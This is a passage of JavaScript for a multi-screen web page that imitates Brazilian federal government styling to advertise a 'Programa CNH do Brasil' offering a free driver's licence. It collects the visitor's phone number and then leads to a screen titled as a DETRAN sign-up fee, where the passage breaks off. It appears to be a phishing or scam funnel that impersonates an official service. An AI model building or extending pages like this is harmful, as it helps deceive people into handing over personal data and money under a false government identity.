        searchBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); font-size: 16px; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        searchBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001c.03.04.062.078.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1.007 1.007 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0z"/></svg>';
        nav.appendChild(searchBtn);
        
        this.container.appendChild(nav);
        
        // Criar container principal
        const main = document.createElement('main');
        main.id = 'main-signin';
        main.style.cssText = 'width: 100%; max-width: 800px; margin: 20px auto; min-height: 100vh; padding: 20px;';

        // Card principal que envolve todo o conteúdo
        const card = document.createElement('div');
        card.className = 'card';
        card.style.cssText = 'width: 100%; align-items: flex-start; padding: 2rem; background-color: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);';

        const title = document.createElement('h3');
        title.className = 'text-center w-full text-lg font-bold mb-6';
        title.textContent = 'Confirme seus dados para o cadastro no Programa CNH do Brasil';
        title.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 1rem; font-weight: 600;';
        card.appendChild(title);

        const content = document.createElement('div');
        content.className = 'w-full';

        const questionContainer = document.createElement('div');
        
        // Número e pergunta
        const questionHeader = document.createElement('div');
        questionHeader.className = 'flex items-center gap-3 mb-4';
        
        const numberCircle = document.createElement('div');
        numberCircle.className = 'flex items-center justify-center w-6 h-6 rounded-full bg-[#1351B4] text-white text-sm font-medium';
        numberCircle.textContent = '7';
        numberCircle.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; font-weight: 500;';
        questionHeader.appendChild(numberCircle);
        
        const questionText = document.createElement('p');
        questionText.className = 'font-semibold text-base';
        questionText.innerHTML = '<strong>qual é o seu telefone?</strong>';
        questionText.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; font-weight: 600;';
        questionHeader.appendChild(questionText);
        
        questionContainer.appendChild(questionHeader);

        // Campo de telefone
        const phoneContainer = document.createElement('div');
        phoneContainer.className = 'pl-4';
        
        const phoneInput = document.createElement('input');
        phoneInput.type = 'tel';
        phoneInput.id = 'phone-input';
        phoneInput.placeholder = 'Digite seu telefone com DDD (ex: 11 98765-4321)';
        phoneInput.style.cssText = 'width: 100%; padding: 12px; border: 2px solid #e5e7eb; border-radius: 8px; font-size: 0.875rem; font-family: Rawline, system-ui, sans-serif; outline: none; transition: border-color 0.3s;';
        
        phoneInput.addEventListener('focus', () => {
            phoneInput.style.borderColor = 'rgb(19, 81, 180)';
        });
        
        phoneInput.addEventListener('blur', () => {
            phoneInput.style.borderColor = '#e5e7eb';
        });
        
        // Formatação automática do telefone
        phoneInput.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 11) value = value.slice(0, 11);
            
            if (value.length > 0) {
                if (value.length <= 2) {
                    value = value;
                } else if (value.length <= 7) {
                    value = value.slice(0, 2) + ' ' + value.slice(2);
                } else {
                    value = value.slice(0, 2) + ' ' + value.slice(2, 7) + '-' + value.slice(7);
                }
            }
            e.target.value = value;
        });
        
        phoneContainer.appendChild(phoneInput);
        questionContainer.appendChild(phoneContainer);

        // Mensagem de erro (criar antes do botão que a usa)
        const errorMessage = document.createElement('div');
        errorMessage.className = 'error-message mt-4 p-3 bg-red-50 border border-red-200 rounded-md text-red-700 text-sm';
        errorMessage.style.display = 'none';
        errorMessage.textContent = 'Por favor, digite um valor válido.';

        // Botão Confirmar
        const buttonContainer = document.createElement('div');
        buttonContainer.className = 'flex justify-center mt-6';
        
        const confirmBtn = document.createElement('button');
        confirmBtn.type = 'button';
        confirmBtn.className = 'button-continuar flex items-center justify-center gap-2 min-w-[160px]';
        confirmBtn.textContent = 'Confirmar';
        confirmBtn.addEventListener('click', () => {
            const phone = phoneInput.value.trim();
            if (!phone) {
                // Campo vazio - mostrar erro
                errorMessage.textContent = 'Por favor, digite seu telefone.';
                errorMessage.style.display = 'block';
                return;
            }
            
            // Validação básica de telefone
            const phoneRegex = /^\d{2}\s\d{4,5}-\d{4}$/;
            if (!phoneRegex.test(phone)) {
                errorMessage.textContent = 'Por favor, digite um telefone válido com DDD.';
                errorMessage.style.display = 'block';
                return;
            }
            
            // Esconder mensagem de erro
            errorMessage.style.display = 'none';
            
            // Estado de processando
            confirmBtn.innerHTML = '<svg class="animate-spin" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0a8 8 0 1 0 8 8A8 8 0 0 0 8 0zM4.5 7.5a.5.5 0 0 1 .5-.5h6a.5.5 0 0 1 0 1H5a.5.5 0 0 1-.5-.5z"/></svg> Processando...';
            confirmBtn.disabled = true;
            
            // Armazenar telefone e prosseguir
            localStorage.setItem('userPhone', phone);
            
            setTimeout(() => {
                confirmBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M10.97 4.97a.75.75 0 0 1 1.07 1.05l-3.99 4.99a.75.75 0 0 1-1.08.02L4.324 8.384a.75.75 0 1 1 1.06-1.06l2.094 2.093 3.473-4.425a.75.75 0 0 1 1.02-.12z"/></svg> Confirmado';
                
                setTimeout(() => {
                    this.navigateToScreen('program');
                }, 500);
            }, 1000);
        });
        
        buttonContainer.appendChild(confirmBtn);
        questionContainer.appendChild(buttonContainer);

        content.appendChild(questionContainer);
        card.appendChild(content);
        main.appendChild(card);
        main.appendChild(errorMessage);
        
        // Adicionar header e tela de verificação ao container
        this.container.appendChild(main);
    }

    showProgramInfoScreen() {
        // Limpar completamente o container
        this.container.innerHTML = '';
        
        // Criar header com Font Awesome
        const mainHeader = this.createHeaderWithFA();
        this.container.appendChild(mainHeader);
        
        // Criar navegação secundária
        const nav = document.createElement('nav');
        nav.style.cssText = 'background-color: white; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium medium 1px; border-style: none none solid; border-color: currentcolor currentcolor rgb(229, 229, 229); border-image: initial; box-shadow: none;';
        
        const menuContainer = document.createElement('button');
        menuContainer.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); display: flex; align-items: center; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuContainer.innerHTML = '<svg aria-hidden="true" style="margin-right: 10px; font-size: 16px; background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M2.5 12a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5z"/></svg><span style="color: rgb(102, 102, 102); font-size: 1rem; font-weight: 300; line-height: 20px; padding-top: 2px; background: none; box-shadow: none;">Programa CNH do Brasil</span>';
        nav.appendChild(menuContainer);
        
        const searchBtn = document.createElement('button');
        searchBtn.setAttribute('aria-label', 'Pesquisar');
        searchBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); font-size: 16px; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        searchBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001c.03.04.062.078.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1.007 1.007 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0z"/></svg>';
        nav.appendChild(searchBtn);
        
        this.container.appendChild(nav);
        
        // Criar container principal seguindo exatamente o HTML original
        const main = document.createElement('main');
        main.id = 'main-signin';
        main.style.cssText = 'width: 100%; max-width: 1200px; margin: 0px auto; padding: 1rem;';

        const container = document.createElement('div');
        container.className = 'w-full';

        const content = document.createElement('div');

        // Número e título
        const header = document.createElement('div');
        header.className = 'flex items-center gap-3 mb-4';
        header.style.cssText = 'opacity: 1; transform: none;';
        
        const numberCircle = document.createElement('div');
        numberCircle.className = 'flex items-center justify-center w-6 h-6 rounded-full bg-[#1351B4] text-white text-sm font-medium';
        numberCircle.textContent = '1';
        numberCircle.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; font-weight: 500;';
        header.appendChild(numberCircle);
        
        const title = document.createElement('p');
        title.className = 'font-semibold text-base';
        title.textContent = 'Programa CNH do Brasil';
        title.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; font-weight: 600;';
        header.appendChild(title);
        
        content.appendChild(header);

        // Container com imagem e texto
        const imageTextContainer = document.createElement('div');
        imageTextContainer.className = 'space-y-3 flex flex-col items-center';

        // Imagem
        const imageContainer = document.createElement('div');
        imageContainer.className = 'flex justify-center mb-4';
        imageContainer.style.cssText = 'opacity: 1; transform: none;';
        
        const programImage = document.createElement('img');
        programImage.src = 'img/programa.png';
        programImage.alt = 'Programa CNH do Brasil';
        programImage.className = 'w-[380px] h-auto md:w-[480px] object-contain rounded-[10px] shadow-lg';
        programImage.style.cssText = 'max-height: 400px;';
        
        imageContainer.appendChild(programImage);
        imageTextContainer.appendChild(imageContainer);

        // Container de texto cinza
        const textContainer = document.createElement('div');
        textContainer.className = 'bg-gray-50 p-8 rounded-md w-[380px] md:w-[480px]';
        textContainer.style.cssText = 'opacity: 1; transform: none;';
        
        const descriptionText = document.createElement('p');
        descriptionText.className = 'text-gray-700 leading-relaxed text-base';
        descriptionText.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; line-height: 1.6; text-align: justify;';
        descriptionText.textContent = 'O Programa CNH do Brasil é uma iniciativa do Governo Federal que pode garantir sua Carteira Nacional de Habilitação 100% GRATUITA! Se você for aprovado nos critérios do programa, não pagará nada pela sua CNH. Continue seu cadastro aqui no site para verificar sua elegibilidade.';
        
        textContainer.appendChild(descriptionText);
        imageTextContainer.appendChild(textContainer);
        content.appendChild(imageTextContainer);

        // Botão Avançar
        const buttonContainer = document.createElement('div');
        buttonContainer.className = 'flex justify-center mt-6';
        
        const advanceBtn = document.createElement('button');
        advanceBtn.type = 'button';
        advanceBtn.className = 'button-continuar flex items-center justify-center gap-2 min-w-[160px]';
        advanceBtn.textContent = 'Avançar';
        
        advanceBtn.addEventListener('click', () => {
            // Ir para a tela 2 - Acesso ao Aplicativo com transição suave
            this.transitionScreens(() => this.navigateToScreen('appAccess'));
        });
        
        buttonContainer.appendChild(advanceBtn);
        content.appendChild(buttonContainer);

        container.appendChild(content);
        main.appendChild(container);
        this.container.appendChild(main);
    }

    showAppAccessScreen() {
        // Limpar completamente o container
        this.container.innerHTML = '';
        
        // Criar header com Font Awesome
        const mainHeader = this.createHeaderWithFA();
        this.container.appendChild(mainHeader);
        
        // Criar navegação secundária
        const nav = document.createElement('nav');
        nav.style.cssText = 'background-color: white; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium medium 1px; border-style: none none solid; border-color: currentcolor currentcolor rgb(229, 229, 229); border-image: initial; box-shadow: none;';
        
        const menuContainer = document.createElement('button');
        menuContainer.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); display: flex; align-items: center; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuContainer.innerHTML = '<svg aria-hidden="true" style="margin-right: 10px; font-size: 16px; background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M2.5 12a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5z"/></svg><span style="color: rgb(102, 102, 102); font-size: 1rem; font-weight: 300; line-height: 20px; padding-top: 2px; background: none; box-shadow: none;">Programa CNH do Brasil</span>';
        nav.appendChild(menuContainer);
        
        const searchBtn = document.createElement('button');
        searchBtn.setAttribute('aria-label', 'Pesquisar');
        searchBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); font-size: 16px; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        searchBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001c.03.04.062.078.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1.007 1.007 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0z"/></svg>';
        nav.appendChild(searchBtn);
        
        this.container.appendChild(nav);
        
        // Criar container principal seguindo exatamente o HTML original
        const main = document.createElement('main');
        main.id = 'main-signin';
        main.style.cssText = 'width: 100%; max-width: 1200px; margin: 0px auto; padding: 1rem;';

        const container = document.createElement('div');
        container.className = 'w-full';

        const content = document.createElement('div');

        // Número 2 e título
        const header = document.createElement('div');
        header.className = 'flex items-center gap-3 mb-4';
        header.style.cssText = 'opacity: 1; transform: none;';
        
        const numberCircle = document.createElement('div');
        numberCircle.className = 'flex items-center justify-center w-6 h-6 rounded-full bg-[#1351B4] text-white text-sm font-medium';
        numberCircle.textContent = '2';
        numberCircle.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; font-weight: 500;';
        header.appendChild(numberCircle);
        
        const title = document.createElement('p');
        title.className = 'font-semibold text-base';
        title.textContent = 'Acesso ao Aplicativo';
        title.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; font-weight: 600;';
        header.appendChild(title);
        
        content.appendChild(header);

        // Container com imagem e texto
        const imageTextContainer = document.createElement('div');
        imageTextContainer.className = 'space-y-3 flex flex-col items-center';

        // Imagem cnhapp.png
        const imageContainer = document.createElement('div');
        imageContainer.className = 'flex justify-center mb-4';
        imageContainer.style.cssText = 'opacity: 1; transform: none;';
        
        const appImage = document.createElement('img');
        appImage.src = 'img/cnhapp.png';
        appImage.alt = 'Acesso ao Aplicativo';
        appImage.className = 'w-[380px] h-auto md:w-[480px] object-contain rounded-[10px] shadow-lg';
        appImage.style.cssText = 'max-height: 400px;';
        
        imageContainer.appendChild(appImage);
        imageTextContainer.appendChild(imageContainer);

        // Container de texto cinza
        const textContainer = document.createElement('div');
        textContainer.className = 'bg-gray-50 p-8 rounded-md w-[380px] md:w-[480px]';
        textContainer.style.cssText = 'opacity: 1; transform: none;';
        
        const descriptionText = document.createElement('p');
        descriptionText.className = 'text-gray-700 leading-relaxed text-base';
        descriptionText.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; line-height: 1.6; text-align: justify;';
        descriptionText.textContent = 'Após finalizar seu cadastro, você receberá acesso ao aplicativo oficial do programa. Use seu CPF para acessar e acompanhar todo o processo de obtenção da sua CNH de forma simples e prática.';
        
        textContainer.appendChild(descriptionText);
        imageTextContainer.appendChild(textContainer);
        content.appendChild(imageTextContainer);

        // Botão Avançar
        const buttonContainer = document.createElement('div');
        buttonContainer.className = 'flex justify-center mt-6';
        
        const advanceBtn = document.createElement('button');
        advanceBtn.type = 'button';
        advanceBtn.className = 'button-continuar flex items-center justify-center gap-2 min-w-[160px]';
        advanceBtn.textContent = 'Avançar';
        
        advanceBtn.addEventListener('click', () => {
            // Ir para a tela 3 - Aulas Teóricas e Práticas com transição suave
            this.transitionScreens(() => this.navigateToScreen('classes'));
        });
        
        buttonContainer.appendChild(advanceBtn);
        content.appendChild(buttonContainer);

        container.appendChild(content);
        main.appendChild(container);
        this.container.appendChild(main);
    }

    showClassesScreen() {
        // Limpar completamente o container
        this.container.innerHTML = '';
        
        // Criar header com Font Awesome
        const mainHeader = this.createHeaderWithFA();
        this.container.appendChild(mainHeader);
        
        // Criar navegação secundária
        const nav = document.createElement('nav');
        nav.style.cssText = 'background-color: white; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium medium 1px; border-style: none none solid; border-color: currentcolor currentcolor rgb(229, 229, 229); border-image: initial; box-shadow: none;';
        
        const menuContainer = document.createElement('button');
        menuContainer.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); display: flex; align-items: center; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuContainer.innerHTML = '<svg aria-hidden="true" style="margin-right: 10px; font-size: 16px; background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M2.5 12a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5z"/></svg><span style="color: rgb(102, 102, 102); font-size: 1rem; font-weight: 300; line-height: 20px; padding-top: 2px; background: none; box-shadow: none;">Programa CNH do Brasil</span>';
        nav.appendChild(menuContainer);
        
        const searchBtn = document.createElement('button');
        searchBtn.setAttribute('aria-label', 'Pesquisar');
        searchBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); font-size: 16px; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        searchBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001c.03.04.062.078.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1.007 1.007 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0z"/></svg>';
        nav.appendChild(searchBtn);
        
        this.container.appendChild(nav);
        
        // Criar container principal seguindo exatamente o HTML original
        const main = document.createElement('main');
        main.id = 'main-signin';
        main.style.cssText = 'width: 100%; max-width: 1200px; margin: 0px auto; padding: 1rem;';

        const container = document.createElement('div');
        container.className = 'w-full';

        const content = document.createElement('div');

        // Número 3 e título
        const header = document.createElement('div');
        header.className = 'flex items-center gap-3 mb-4';
        header.style.cssText = 'opacity: 1; transform: none;';
        
        const numberCircle = document.createElement('div');
        numberCircle.className = 'flex items-center justify-center w-6 h-6 rounded-full bg-[#1351B4] text-white text-sm font-medium';
        numberCircle.textContent = '3';
        numberCircle.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; font-weight: 500;';
        header.appendChild(numberCircle);
        
        const title = document.createElement('p');
        title.className = 'font-semibold text-base';
        title.textContent = 'Aulas Teóricas e Práticas';
        title.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; font-weight: 600;';
        header.appendChild(title);
        
        content.appendChild(header);

        // Container com imagem e texto
        const imageTextContainer = document.createElement('div');
        imageTextContainer.className = 'space-y-3 flex flex-col items-center';

        // Imagem cnhapp.png (mesma imagem)
        const imageContainer = document.createElement('div');
        imageContainer.className = 'flex justify-center mb-4';
        imageContainer.style.cssText = 'opacity: 1; transform: none;';
        
        const appImage = document.createElement('img');
        appImage.src = 'img/cnhapp.png';
        appImage.alt = 'Aulas Teóricas e Práticas';
        appImage.className = 'w-[380px] h-auto md:w-[480px] object-contain rounded-[10px] shadow-lg';
        appImage.style.cssText = 'max-height: 400px;';
        
        imageContainer.appendChild(appImage);
        imageTextContainer.appendChild(imageContainer);

        // Container de texto cinza
        const textContainer = document.createElement('div');
        textContainer.className = 'bg-gray-50 p-8 rounded-md w-[380px] md:w-[480px]';
        textContainer.style.cssText = 'opacity: 1; transform: none;';
        
        const descriptionText = document.createElement('p');
        descriptionText.className = 'text-gray-700 leading-relaxed text-base';
        descriptionText.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; line-height: 1.6; text-align: justify;';
        descriptionText.textContent = 'Suas aulas teóricas serão realizadas 100% pelo aplicativo, totalmente GRATUITAS! Para a parte prática, você precisará fazer apenas 2 horas de aula com um instrutor credenciado pelo DETRAN. Se você for aprovado para a gratuidade do programa, essas aulas práticas também serão gratuitas!';
        
        textContainer.appendChild(descriptionText);
        imageTextContainer.appendChild(textContainer);
        content.appendChild(imageTextContainer);

        // Botão Avançar
        const buttonContainer = document.createElement('div');
        buttonContainer.className = 'flex justify-center mt-6';
        
        const advanceBtn = document.createElement('button');
        advanceBtn.type = 'button';
        advanceBtn.className = 'button-continuar flex items-center justify-center gap-2 min-w-[160px]';
        advanceBtn.textContent = 'Avançar';
        
        advanceBtn.addEventListener('click', () => {
            // Ir para a tela 4 - Emissão da CNH com transição suave
            this.transitionScreens(() => this.navigateToScreen('cnhIssuance'));
        });
        
        buttonContainer.appendChild(advanceBtn);
        content.appendChild(buttonContainer);

        container.appendChild(content);
        main.appendChild(container);
        this.container.appendChild(main);
    }

    showCnhIssuanceScreen() {
        // Limpar completamente o container
        this.container.innerHTML = '';
        
        // Criar header com Font Awesome
        const mainHeader = this.createHeaderWithFA();
        this.container.appendChild(mainHeader);
        
        // Criar navegação secundária
        const nav = document.createElement('nav');
        nav.style.cssText = 'background-color: white; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium medium 1px; border-style: none none solid; border-color: currentcolor currentcolor rgb(229, 229, 229); border-image: initial; box-shadow: none;';
        
        const menuContainer = document.createElement('button');
        menuContainer.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); display: flex; align-items: center; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuContainer.innerHTML = '<svg aria-hidden="true" style="margin-right: 10px; font-size: 16px; background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M2.5 12a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5z"/></svg><span style="color: rgb(102, 102, 102); font-size: 1rem; font-weight: 300; line-height: 20px; padding-top: 2px; background: none; box-shadow: none;">Programa CNH do Brasil</span>';
        nav.appendChild(menuContainer);
        
        const searchBtn = document.createElement('button');
        searchBtn.setAttribute('aria-label', 'Pesquisar');
        searchBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); font-size: 16px; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        searchBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001c.03.04.062.078.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1.007 1.007 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0z"/></svg>';
        nav.appendChild(searchBtn);
        
        this.container.appendChild(nav);
        
        // Criar container principal seguindo exatamente o HTML original
        const main = document.createElement('main');
        main.id = 'main-signin';
        main.style.cssText = 'width: 100%; max-width: 1200px; margin: 0px auto; padding: 1rem;';

        const container = document.createElement('div');
        container.className = 'w-full';

        const content = document.createElement('div');

        // Número 4 e título
        const header = document.createElement('div');
        header.className = 'flex items-center gap-3 mb-4';
        header.style.cssText = 'opacity: 1; transform: none;';
        
        const numberCircle = document.createElement('div');
        numberCircle.className = 'flex items-center justify-center w-6 h-6 rounded-full bg-[#1351B4] text-white text-sm font-medium';
        numberCircle.textContent = '4';
        numberCircle.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; font-weight: 500;';
        header.appendChild(numberCircle);
        
        const title = document.createElement('p');
        title.className = 'font-semibold text-base';
        title.textContent = 'Emissão da CNH';
        title.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; font-weight: 600;';
        header.appendChild(title);
        
        content.appendChild(header);

        // Container com imagem e texto
        const imageTextContainer = document.createElement('div');
        imageTextContainer.className = 'space-y-3 flex flex-col items-center';

        // Imagem cnhapp.png (mesma imagem)
        const imageContainer = document.createElement('div');
        imageContainer.className = 'flex justify-center mb-4';
        imageContainer.style.cssText = 'opacity: 1; transform: none;';
        
        const appImage = document.createElement('img');
        appImage.src = 'img/cnhapp.png';
        appImage.alt = 'Emissão da CNH';
        appImage.className = 'w-[380px] h-auto md:w-[480px] object-contain rounded-[10px] shadow-lg';
        appImage.style.cssText = 'max-height: 400px;';
        
        imageContainer.appendChild(appImage);
        imageTextContainer.appendChild(imageContainer);

        // Container de texto cinza
        const textContainer = document.createElement('div');
        textContainer.className = 'bg-gray-50 p-8 rounded-md w-[380px] md:w-[480px]';
        textContainer.style.cssText = 'opacity: 1; transform: none;';
        
        const descriptionText = document.createElement('p');
        descriptionText.className = 'text-gray-700 leading-relaxed text-base';
        descriptionText.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; line-height: 1.6; text-align: justify;';
        descriptionText.textContent = 'Após aprovação nos exames teórico e prático, sua CNH será emitida e enviada diretamente para seu endereço. Todo o processo é acompanhado pelo sistema oficial do programa.';
        
        textContainer.appendChild(descriptionText);
        imageTextContainer.appendChild(textContainer);
        content.appendChild(imageTextContainer);

        // Botão Avançar
        const buttonContainer = document.createElement('div');
        buttonContainer.className = 'flex justify-center mt-6';
        
        const advanceBtn = document.createElement('button');
        advanceBtn.type = 'button';
        advanceBtn.className = 'button-continuar flex items-center justify-center gap-2 min-w-[160px]';
        advanceBtn.textContent = 'Avançar';
        
        advanceBtn.addEventListener('click', () => {
            // Ir para a tela 5 - Taxa de Adesão DETRAN com transição suave
            this.transitionScreens(() => this.navigateToScreen('tax'));
        });
        
        buttonContainer.appendChild(advanceBtn);
        content.appendChild(buttonContainer);

        container.appendChild(content);
        main.appendChild(container);
        this.container.appendChild(main);
    }

    showTaxScreen() {
        // Limpar completamente o container
        this.container.innerHTML = '';
        
        // Criar header com Font Awesome
        const mainHeader = this.createHeaderWithFA();
        this.container.appendChild(mainHeader);
        
        // Criar navegação secundária
        const nav = document.createElement('nav');
        nav.style.cssText = 'background-color: white; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium medium 1px; border-style: none none solid; border-color: currentcolor currentcolor rgb(229, 229, 229); border-image: initial; box-shadow: none;';
        
        const menuContainer = document.createElement('button');
        menuContainer.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); display: flex; align-items: center; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuContainer.innerHTML = '<svg aria-hidden="true" style="margin-right: 10px; font-size: 16px; background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M2.5 12a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5z"/></svg><span style="color: rgb(102, 102, 102); font-size: 1rem; font-weight: 300; line-height: 20px; padding-top: 2px; background: none; box-shadow: none;">Programa CNH do Brasil</span>';
        nav.appendChild(menuContainer);
        
        const searchBtn = document.createElement('button');
        searchBtn.setAttribute('aria-label', 'Pesquisar');
        searchBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); font-size: 16px; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        searchBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001c.03.04.062.078.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1.007 1.007 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0z"/></svg>';
        nav.appendChild(searchBtn);
        
        this.container.appendChild(nav);
        
        // Criar container principal seguindo exatamente o HTML original
        const main = document.createElement('main');
        main.id = 'main-signin';
        main.style.cssText = 'width: 100%; max-width: 1200px; margin: 0px auto; padding: 1rem;';

        const container = document.createElement('div');
        container.className = 'w-full';

        const content = document.createElement('div');

        // Número 5 e título
        const header = document.createElement('div');
        header.className = 'flex items-center gap-3 mb-4';
        header.style.cssText = 'opacity: 1; transform: none;';
        
        const numberCircle = document.createElement('div');
        numberCircle.className = 'flex items-center justify-center w-6 h-6 rounded-full bg-[#1351B4] text-white text-sm font-medium';
        numberCircle.textContent = '5';
        numberCircle.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; font-weight: 500;';
        header.appendChild(numberCircle);
        
        const title = document.createElement('p');
        title.className = 'font-semibold text-base';
        title.textContent = 'Taxa de Adesão DETRAN';
        title.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; font-weight: 600;';
        header.appendChild(title);
        
